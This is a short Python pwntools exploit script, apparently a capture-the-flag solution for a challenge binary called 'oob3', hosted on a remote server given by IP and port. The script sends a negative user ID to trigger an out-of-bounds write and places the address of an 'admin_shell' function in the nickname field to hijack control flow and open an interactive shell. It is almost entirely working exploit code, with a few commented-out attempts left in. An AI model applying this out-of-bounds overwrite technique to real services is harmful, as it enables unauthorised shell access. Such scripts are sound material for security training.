from pwn import *

admin_shell = p64(0x400924)
#admin_ahell = '\x24\x09\x40\x00'
r = process('./oob3')
r = remote('140.110.112.31', 3113)
print r.recvuntil('User ID: ')
r.sendline(str(-19))
print r.recvuntil('Nickname: ')
#r.send(str(admin_shell))
r.sendline(str(admin_shell))
#print r.recvline()
#print r.recvuntil('PIN: ')
#r.sendline('1')
#r.sendline(str(0))#trash
r.interactive()
